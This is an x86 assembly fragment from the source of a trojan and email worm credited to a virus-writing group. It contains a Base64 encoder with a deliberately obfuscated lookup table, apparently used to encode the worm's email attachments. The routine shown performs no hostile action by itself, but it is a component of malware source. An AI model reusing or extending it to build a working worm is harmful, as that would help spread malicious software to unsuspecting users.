   ; Trojan/I-Worm/Palm/Wm/W32.SABi¡ II
   ; 
   ; by: NBK & Ultras / MATRiX

ofs equ offset
by equ byte ptr 
dwo equ dword ptr 

BASE64 proc   ;   Vecna (c)
       cld
       push edi
       push 3
       call @@trans
trans_table = $
    db not 'A', not 'B', not 'C', not 'D', not 'E', not 'F', not 'G', not 'H', not 'I', not 'J'
    db not 'K', not 'L', not 'M', not 'N', not 'O', not 'P', not 'Q', not 'R', not 'S', not 'T'
    db not 'U', not 'V', not 'W', not 'X', not 'Y', not 'Z', not 'a', not 'b', not 'c', not 'd'
    db not 'e', not 'f', not 'g', not 'h', not 'i', not 'j', not 'k', not 'l', not 'm', not 'n'
    db not 'o', not 'p', not 'q', not 'r', not 's', not 't', not 'u', not 'v', not 'w', not 'x'
    db not 'y', not 'z', not '0', not '1', not '2', not '3', not '4', not '5', not '6', not '7'
    db not '8', not '9', not '+', not '/'
chars dd ?                            ;contador de caracteres
  @@trans:
       pop ebx
       push (ofs chars-ofs trans_table)
       pop ecx
  @@1:
       not by [ebx+ecx-1]                      ;crazy, isnt? ;)
       loop @@1       ;now, imagine what i can do if i wasnt stoned all time
       pop ecx
       cdq
       mov dwo [ebx+ecx+((ofs chars-ofs trans_table)-3)], edx  ;tricky ;)
       div ecx
       mov ecx, eax
       push edx
   @@loop:
       lodsd
       dec esi                              ;edx=original
       mov edx, eax                         ;edx=work copy
       call Temp
       call CODE64Block3
       call CODE64Block4
       loop @@loop
       pop ecx				;get rest
       jecxz @@done
       lodsd
       dec ecx
       jz @@rest1
       movzx edx, ax                            ;use only 2 bytes
       call Temp
       call CODE64Block3
       jmp @@end
   @@rest1:
       movzx edx, al                            ;use 1 byte only
       call Temp
       inc ecx
       inc ecx
   @@end:
       mov al, '='
       rep stosb
   @@done:
       mov eax, 0A0D0A0Dh
       stosd
       push (ofs chars-ofs trans_table)
       pop ecx
  @@2:
       not by [ebx+ecx-1]
       loop @@2
       pop ecx
       sub edi, ecx                            ;edi=buffer
       xchg ecx, edi                           ;ecx=size
       ret
BASE64 endp


Temp   proc
       call CODE64Block1                ;little optimizing routine
       call CODE64Block2
       ret
Temp   endp


CODE64Block1:
       mov eax, edx
       shr eax, 02h
  process3:
       jmp process

CODE64Block2:
       mov eax, edx
       shl al, 04h
       shr ah, 04h
  process2:
       or al, ah                        ;chained jmps
       jmp process3             ;another "why make it easy?" (c) Vecna ;)

CODE64Block3:
       mov eax, edx
       shr eax, 08h
       shl al, 02h
       shr ah, 06h
       jmp process2

CODE64Block4:
       mov eax,edx
       shr eax,10h

  process:
       and al,00111111b
       xlatb
       stosb
       mov eax, dwo [ebx+(ofs chars-ofs trans_table)]
       inc eax
       mov dwo [ebx+(ofs chars-ofs trans_table)], eax
       pusha
       push 0000004Ch
       pop ecx
       cdq
       div ecx
       test edx, edx
       popa
       jnz @@noline
       mov ax, 0A0Dh
       stosw
   @@noline:
       ret
